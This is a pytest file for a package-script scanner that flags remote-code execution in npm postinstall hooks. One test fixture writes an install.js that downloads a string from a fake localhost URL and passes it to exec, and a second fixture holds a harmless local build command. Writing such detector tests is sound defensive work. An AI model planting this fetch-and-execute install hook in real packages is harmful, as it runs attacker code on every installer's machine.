import json

from core.script_scan import scan_package

# Fake local address only: the scanner reads text and never opens a connection.
FAKE_PAYLOAD_URL = "http://localhost:9999/payload"


def _write_package(tmp_path, name, source):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": name, "scripts": {"postinstall": "node install.js"}})
    )
    (tmp_path / "install.js").write_text(source)
    return tmp_path


def test_exec_of_downloaded_string_fires(tmp_path):
    package = _write_package(
        tmp_path,
        "fake-remote-exec",
        f"""
const https = require("https");
const {{ exec }} = require("child_process");
https.get("{FAKE_PAYLOAD_URL}", (res) => {{
  let body = "";
  res.on("data", (chunk) => (body += chunk));
  res.on("end", () => exec(body));
}});
""",
    )
    findings = scan_package(package)["findings"]
    assert "REMOTE_EXEC" in {f["rule"] for f in findings}


def test_plain_local_exec_does_not_fire(tmp_path):
    package = _write_package(
        tmp_path,
        "fake-local-exec",
        """
const { execSync } = require("child_process");
execSync("node-gyp rebuild");
""",
    )
    findings = scan_package(package)["findings"]
    assert "REMOTE_EXEC" not in {f["rule"] for f in findings}
